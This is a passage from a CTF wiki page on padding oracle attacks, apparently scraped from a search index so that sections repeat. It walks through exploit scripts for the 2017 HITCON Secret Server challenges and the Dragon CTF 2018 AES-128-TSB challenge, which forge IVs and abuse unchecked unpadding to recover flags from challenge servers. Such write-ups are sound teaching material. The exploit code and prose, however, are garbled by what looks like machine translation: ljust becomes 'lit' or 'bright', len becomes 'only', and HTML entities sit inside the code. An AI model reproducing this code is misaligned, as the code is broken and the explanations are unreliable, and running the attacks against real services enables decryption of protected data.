), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi ) [ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 ' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () The final result is as follows Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 2017 HITCON Secret Server Revenge \u00b6 Description \u00b6 The password of zip is the flag of \"Secret Server\" Analysis \u00b6 This program continues with the above program, but this time a simple modification The iv of the encryption algorithm is unknown, but can be derived from the message encrypted by Welcome. The program has a 56-byte token. The program can perform up to 340 operations, so the above blasting is naturally not feasible The general process of the program is as follows After proof of work 2. Send \"Welcome!!\" encrypted message 3. In 340 operations, you need to guess the value of the token and then automatically output the flag. Vulnerability \u00b6 Of course, the loopholes in the previous topic still exist in this topic, namely Execute the given command arbitrarily Length truncation Using ideas \u00b6 Due to the limitation of the number of 340, although we can still get the value of md5(token[:i]) encrypted ( here we need to pay attention to this part of the encryption is exactly 32 bytes, the first 16 bytes are The value after md5 is encrypted, the next 16 bytes are completely filled with encrypted bytes. Here md5(token[:i]) refers specifically to the first 16 bytes.). However, we can't blast 256 times again in order to get a character. Since it is not possible to blast, is it possible to get the size of one byte at a time? Here, let's take a look at the information that the program may leak. The encrypted value of the md5 value of some messages. Here we can get the encrypted value of md5(token[:i]) . Unpad will unmap the decrypted message each time. This byte is determined based on the last byte of the decrypted message. If we can calculate the size of this byte, then we may know the value of a byte. Here we delve into the information leak of unpad. If we put the encryption IV and encrypt(md5(token[:i])) after a ciphertext C to form C|IV|encrypt(md5(token[:i])) , then decrypt The last plaintext block of the outgoing message is md5(token[:i]) . Furthermore, in the unpad, the last byte (0-255) of md5(token[:i]) is used for unpad, and then the specified command (such as md5) is executed on the string after the unpad. Then, if we pre-configure some hashed samples after the message hash, and then compare the results of the above execution with the sample, if they are the same, then we can basically determine the md5(token[:i]) * * Last byte . However, if the last byte of md5(token[:i]) is less than 16, then some values in md5 will be used in unpad, and this part of the value, due to token[:i] for different lengths Almost all will not be the same. So special handling may be required. We already know the key to this problem, which is to generate a sample of the encrypted result corresponding to the size of the unpad byte, in order to facilitate the lookup table. The specific use ideas are as follows Bypass proof of work. Get the token encrypted result token_enc , which will add 7 bytes &quot;token: &quot; in front of the token. Therefore, the length after encryption is 64. Get the result of encrypt(md5(token[:i])) , which is a total of 57, including the padding of the last token. Construct a sample that corresponds to the size of the unpad. Here we construct the ciphertext token_enc|padding|IV_indexi|welcome_enc . Since IV_indexi is to modify the last byte of the last plaintext block, the byte is in the process of being changed. If we want to get some fixed byte hashes, this part can't be added naturally. Therefore, the size of the unpad ranges from 17 to 255 when the sample is generated here. If the last byte of md5(token[:i]) is less than 17 at the end of the test, there will be some unknown samples. A natural idea is that we directly get 255-17+1 such multiple samples, however, if we do this, according to the number of times above 340 (255-17+1+57+56>340), we obviously can't Get all the bytes to the token. So here we need to find ways to reuse some content, here we choose to reuse the result of encrypt(md5(token[:i])) . Then we need to ensure that the number of times is sufficient on the one hand, and on the other hand, the previous results can be reused. Here we set the unpad loop to 17 to 208, and make the unpad more than 208 when we just unpad to where we can reuse. It should be noted here that when the last byte of md5(token[:i]) is 0, all decrypted plaintext unpad will be dropped, so the ciphertext of command not found will appear. Construct the ciphertext token_enc|padding|IV|encrypt(md5(token[:i])) again, then use the last byte of md5(token[:i]) for unpad when decrypting. If this byte is not less than 17 or 0, it can be processed. If this byte is less than 17, then obviously, the result of the last md5 returned to the user is not within the sample range, then we modify the highest bit of its last byte so that it can fall within the sample range after the unpad. In this way, we can guess the last byte of md5(token[:i]) . After guessing the last byte of md5(token[:i]) , we can brute 256 times locally and find out that all hashes are at the end of md5(token[:i]) The last byte of the character. However, in the sixth step, for a md5(token[:i]) we may find multiple alternative characters because we only need to make the last byte of the given byte. So, the question is, how do you delete some extra candidate strings? Here I chose a small trick, which enumerates the padding of the token at the same time as the byte-by-byte enumeration. Since padding is fixed at 0x01, we only need to filter out all tokens that are not 0x01 at the end. Here, the sleep in the code is commented out during the test. In order to speed up the interaction. Use the code as follows from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {} \" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( only ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = only ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[ {} ]\" . format ( i )) get_md5_iv = flipplain ( & quot ; token : & quot ; . lit ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( & quot ; unpad size 1 - 16 & quot ;) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () The effect is as follows ... 79 1 hitcon { uNp @ d_M3th0D_i5_am4Z1n9! } Teaser Dragon CTF 2018 AES-128-TSB \u00b6 This topic is still very interesting, the title is described as follows Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is! Server: aes-128-tsb.hackable.software 1337 server.py The attachment and the final exp are found by the ctf-challenge repository. The basic process of the topic is Continuously receive two strings a and b, where a is plaintext and b is ciphertext, note b needs to satisfy the tail just equal to iv after decryption. if a and b are equal, then a is gimme_flag and the encrypted flag is output. Otherwise, output a string of randomly encrypted strings. Otherwise output a string of plain text. In addition, we can also find that there is a problem with the unpad in the title, and the specified length can be truncated. def unpad ( msg ): if not msg : return '' return msg [: - ord ( msg [ - 1 ])] In the beginning, the very straightforward idea is to enter 0 for the lengths of a and b, then you can bypass the a==b check to get a string of random ciphertext encrypted strings. However, it does not seem to have any effect, let's analyze the encryption process. def tsb_encrypt ( aes , msg ): msg = pad ( msg ) iv = get_random_bytes ( 16 ) prev_pt = iv prev_ct = iv ct = '' for block in split_by ( msg , 16 ) + [ iv ]: ct_block = xor ( block , prev_pt ) ct_block = aes . encrypt ( ct_block ) ct_block = xor ( ct_block , prev_ct ) ct += ct_block prev_pt = block prev_ct = ct_block return iv + ct Let's assume that P_0=iv, C_0=iv P_0=iv, C_0=iv , then C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) So, assuming the message length is 16, similar to the length of the gimme_flag padding we want to get, then $ C_1 = IV oplus E (IV oplus P_1) $ C_2=C_1 \\oplus E(P_1 \\oplus IV) C_2=C_1 \\oplus E(P_1 \\oplus IV) It is easy to find C_2=IV C_2=IV . ([Pirates] ( https://github.com/pberba/ctf-solutions/tree/master/20180929_teaser_dragon/aes_128_tsb ), the picture below is clearer Conversely, if we send iv+c+iv to the server, we can always bypass the tsb_decrypt mac check. def tsb_decrypt ( aes , msg ): iv , msg = msg [: 16 ], msg [ 16 :] prev_pt = iv prev_ct = iv pt = & #39;&#39; for block in split_by ( msg , 16 ): pt_block = xor ( block , prev_ct ) pt_block = aes . decrypt ( pt_block ) pt_block = xor ( pt_block , prev_pt ) pt += pt_block prev_pt = pt_block prev_ct = block pt , mac = pt [: - 16 ], pt [ - 16 :] if mac != iv : raise CryptoError () return unpad ( pt ) Then at this point, the message decrypted by the server is $ unpad (IV oplus D (C_1 oplus IV)) $ Get the last byte of the plaintext \u00b6 We can consider controlling the D decrypted message as a constant value, such as all zeros, ie C1=IV , then we can enumerate the last byte of the IV from 0 to 255, get $IV \\oplus D(C_1 \\oplus IV) The last byte of $ is also 0~255. Only when it is 1~15, after the unpad operation, the message length is not 0. Therefore, we can count which numbers cause the length to be non-zero and enumerate as 1 and the remaining flags to 0. def getlast_byte ( iv , block ): iv_pre = iv [: 15 ] iv_last = words ( iv [ - 1 ]) tmp = [] print ( 'get last byte' ) for i in range ( 256 ): send_data ( '' ) iv = iv_pre + chr ( i ) tmpblock = block [: 15 ] + chr ( i ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' in data : tmp . append ( 1 ) else : tmp . append ( 0 ) last_bytes = [] for i in range ( 256 ): if tmp == xor_byte_map [ i ][ 0 ]: last_bytes . append ( xor_byte_map [ i ][ 1 ]) print ( 'possible last byte is ' + str ( last_bytes )) return last_bytes In addition, we can get all the possible cases of the last byte at the beginning of the table, recorded in xor_byte_map. \"\"\" every item is a pair [a,b] a is the xor list b is the idx which is zero when xored \"\"\" xor_byte_map = [] for i in range ( 256 ): a = [] b = 0 for j in range ( 256 ): tmp = i ^ j if tmp > 0 and tmp <= 15 : a . append ( 1 ) else : a . append ( 0 ) if tmp == 0 : b = j xor_byte_map . append ([ a , b ]) By comparing this table, we can know what is possible with the last byte. Decrypt any encrypted block \u00b6 After obtaining the last byte of the plaintext, we can use the unpad vulnerability to get the corresponding plaintext content from length 1 to length 15. def dec_block ( iv , block ): last_bytes = getlast_byte ( iv , block ) iv_pre = iv [: 15 ] iv_last = words ( iv [ - 1 ]) print ( 'try to get plain' ) plain0 = & #39;&#39; for last_byte in last_bytes : plain0 = & #39;&#39; for i in range ( 15 ): print 'idx:' , i tag = false for j in range ( 256 ): send_data ( plain0 + chr ( j )) pad_size = 15 - i iv = iv_pre + chr ( pad_size ^ last_byte ) tmpblock = block [: 15 ] + chr ( pad_size ^ last_byte ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' not in data : # success plain0 + = chr ( j ) tag = True break if not tag : break # means the last byte is ok if plain0 != '' : break plain0 += chr ( iv_last ^ last_byte ) return plain0 Decrypt the specified plaintext \u00b6 This is relatively simple, we hope to use this to get the ciphertext of gimme_flag print ( 'get the cipher of flag' ) gemmi_iv1 = xor ( pad ( 'gimme_flag' ), plain0 ) gemmi_c1 = xor ( gemmi_iv1 , cipher0 ) payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1 send_data ( 'gimme_flag' ) send_data ( payload ) flag_len , flag_cipher = recv_data () Where plain0 and cipher0 are the clear ciphertext pairs we obtained for AES encryption, excluding the two exclusive ORs before and after. Decrypt flag \u00b6 This point is actually achieved by the function of decrypting any encrypted block, as follows print ( 'the flag cipher is ' + flag_cipher . encode ( 'hex' )) flag_cipher = split_by ( flag_cipher , 16 ) print ( 'decrypt the blocks one by one' ) plain = '' for i in range ( len ( flag_cipher ) - 1 ): print ( 'block: ' + str ( i )) if i == 0 : plain += dec_block ( flag_cipher [ i ], flag_cipher [ i + 1 ]) else : iv = plain [ - 16 :] cipher = xor ( xor ( iv , flag_cipher [ i + 1 ]), flag_cipher [ i ]) plain += dec_block ( iv , cipher ) pass print ( 'now plain: ' + plain ) print plain Think about why the ciphertext operation after the second block will be different. The complete code references the ctf-challenge repository. References \u00b6 [Packet Encryption Mode] ( https://en.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5 % E4%BD%9C%E6%A8%A1%E5%BC%8F) https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#padding-oracle-attack","text":"","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#introduction","text":"Padding Oracle Attack attacks generally need to meet the following conditions Encryption Algorithm Encryption algorithm using PKCS5 Padding. Of course, the way OAEP is filled in asymmetric encryption may also be affected. The grouping mode is CBC mode. Attacker ability An attacker can intercept messages encrypted by the above encryption algorithm. The attacker can interact with the padding oracle (the server): the client sends the ciphertext to the server, and the server will use some kind of return information to inform the client whether the padding is normal. Padding Oracle Attack can achieve the following effects Decrypt any given ciphertext without knowing the key and IV.","title":"Introduction"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#principle","text":"The basic principles of the Padding Oracle Attack attack are as follows Decrypt a very long message piece by piece. For each message, first decrypt the last byte of the message, then decrypt the second to last byte, and so on. Here we review the CBC Encryption $$ C_i=E_K(P_i \\oplus C_{i-1})\\ IV = C_0 $$ Decryption $$ P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV $$ We mainly focus on decryption, we don't know IV and key here. Here we assume that the length of the ciphertext block is n bytes. Suppose we intercepted ciphertext Y to obtain the last byte of ciphertext Y as an example for analysis. In order to obtain the content of Y, we first need to forge a piece of ciphertext F so that the last byte of the plaintext corresponding to Y can be modified. This is because if we construct the ciphertext F|Y , then the decryption Y is specifically $$ P = D_K (Y) oplus F $$ So modify the last byte of ciphertext F, F_{n} F_{n} , to modify the last byte of the plaintext corresponding to Y. The process of getting the last byte of P is given below. i=0, set each byte of F to be random byte . Set F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 Send F|Y to the server. If the last byte of P is i, then the last padding is 0x01 and no error will occur. Otherwise, only the last P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 bytes of P are P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 and no error will be reported. Also, note that the padding bytes can only be 0 to n. Therefore, if you want to make the error in the case of F randomly and satisfy the padding byte size, the probability is small**. So in the case of no error on the server side, we can think that we did get the correct bytes. In the event of an error, i=i+1, jump to 2. After getting the last byte of P, we can continue to get the second-to-last byte of P. In this case, we need to set F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 and set F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 to enumerate i. So, in summary, Padding Oracle Attack is actually a method of attack with a high probability of success. However, it's important to note that some of the real-world problems that are often encountered are not the standard Padding Oracle Attack mode, and we often need to make some changes.","title":"Principle"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server","text":"","title":"2017 HITCON Secret Server"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#analysis","text":"The encryption used in the program is AES CBC, which uses padding similar to PKCS5. def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] However, in each unpad, no detection is performed, but the unpad is directly executed. Among them, it should be noted that the function that interacts with the user each time is send_msg , accepts the user's plaintext, encrypts it with a fixed 2jpmLoSsOlQrqyqE , and outputs the encrypted result. recv_msg , accepts the user's IV and ciphertext, decrypts the ciphertext, and returns. There will be different actions depending on the results returned. msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' )","title":"Analysis"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#main-vulnerabilities","text":"Here we briefly summarize the parts we have. Encryption The IV when encrypting is fixed and known. 'Welcome!!' Encrypted result. Decryption We can control IV. First of all, since we know the result of the Welcome!! encryption, we can also control the IV in recv_msg, then according to the decryption process $$ P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV $$ If we enter the encrypted result of Welcome!! into recv_msg, the result of direct decryption is (Welcome!!+&#39;\\x07&#39;*7) xor iv , if we properly control the decryption process In the iv passed, then we can control the decrypted result. In other words, we can execute any of the commands described above**. Thus, we can also know the result of the flag decryption. Secondly, on the above basis, if we add the custom IV and Welcome encrypted result after any ciphertext C and pass it to recv_msg as input, then we can control the last byte of the message after decryption. So due to the unpad operation, we can control the length of the decrypted message to be reduced from 0 to 255 .","title":"Main Vulnerabilities"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#using-ideas","text":"Basic use ideas are as follows Bypass proof of work 2. Obtain the encrypted flag according to the way you execute any command. 3. Since the beginning of the flag is hitcon{ , there are 7 bytes in total, so we can still control the iv to make the first 7 bytes after decryption the specified byte. This allows us to execute the get-md5 command on the decrypted message. According to the unpad operation, we can control the decrypted message exactly at the first few bytes of the message. So we can start controlling the decrypted message as hitcon{x , that is, only one byte after hitcon{ . This will result in an encrypted result with a one-byte hash. Similarly, we can also get the result of the encryption with a byte hash. 4. In this case, we can blast locally byte by byte, calculate the corresponding md5 , and then use the arbitrary command execution mode to control the decrypted plaintext to any specified command. If the control is unsuccessful, it means that the byte is incorrect. , need to blast again; if it is correct, then you can directly execute the corresponding command. The specific code is as follows #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): Return msg [: - ord ( msg [ - 1 ])] # Remove the pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( & quot ; hitcon { & quot ; . bright ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . light ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" ), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi ) [ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 ' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () The final result is as follows Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10","title":"Using ideas"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server-revenge","text":"","title":"2017 HITCON Secret Server Revenge"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#description","text":"The password of zip is the flag of \"Secret Server\"","title":"Description"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#analysis_1","text":"This program continues with the above program, but this time a simple modification The iv of the encryption algorithm is unknown, but can be derived from the message encrypted by Welcome. The program has a 56-byte token. The program can perform up to 340 operations, so the above blasting is naturally not feasible The general process of the program is as follows After proof of work 2. Send \"Welcome!!\" encrypted message 3. In 340 operations, you need to guess the value of the token and then automatically output the flag.","title":"Analysis"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#vulnerability","text":"Of course, the loopholes in the previous topic still exist in this topic, namely Execute the given command arbitrarily Length truncation","title":"Vulnerability"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#using-ideas_1","text":"Due to the limitation of the number of 340, although we can still get the value of md5(token[:i]) encrypted ( here we need to pay attention to this part of the encryption is exactly 32 bytes, the first 16 bytes are The value after md5 is encrypted, the next 16 bytes are completely filled with encrypted bytes. Here md5(token[:i]) refers specifically to the first 16 bytes.). However, we can't blast 256 times again in order to get a character. Since it is not possible to blast, is it possible to get the size of one byte at a time? Here, let's take a look at the information that the program may leak. The encrypted value of the md5 value of some messages. Here we can get the encrypted value of md5(token[:i]) . Unpad will unmap the decrypted message each time. This byte is determined based on the last byte of the decrypted message. If we can calculate the size of this byte, then we may know the value of a byte. Here we delve into the information leak of unpad. If we put the encryption IV and encrypt(md5(token[:i])) after a ciphertext C to form C|IV|encrypt(md5(token[:i])) , then decrypt The last plaintext block of the outgoing message is md5(token[:i]) . Furthermore, in the unpad, the last byte (0-255) of md5(token[:i]) is used for unpad, and then the specified command (such as md5) is executed on the string after the unpad. Then, if we pre-configure some hashed samples after the message hash, and then compare the results of the above execution with the sample, if they are the same, then we can basically determine the md5(token[:i]) * * Last byte . However, if the last byte of md5(token[:i]) is less than 16, then some values in md5 will be used in unpad, and this part of the value, due to token[:i] for different lengths Almost all will not be the same. So special handling may be required. We already know the key to this problem, which is to generate a sample of the encrypted result corresponding to the size of the unpad byte, in order to facilitate the lookup table. The specific use ideas are as follows Bypass proof of work. Get the token encrypted result token_enc , which will add 7 bytes &quot;token: &quot; in front of the token. Therefore, the length after encryption is 64. Get the result of encrypt(md5(token[:i])) , which is a total of 57, including the padding of the last token. Construct a sample that corresponds to the size of the unpad. Here we construct the ciphertext token_enc|padding|IV_indexi|welcome_enc . Since IV_indexi is to modify the last byte of the last plaintext block, the byte is in the process of being changed. If we want to get some fixed byte hashes, this part can't be added naturally. Therefore, the size of the unpad ranges from 17 to 255 when the sample is generated here. If the last byte of md5(token[:i]) is less than 17 at the end of the test, there will be some unknown samples. A natural idea is that we directly get 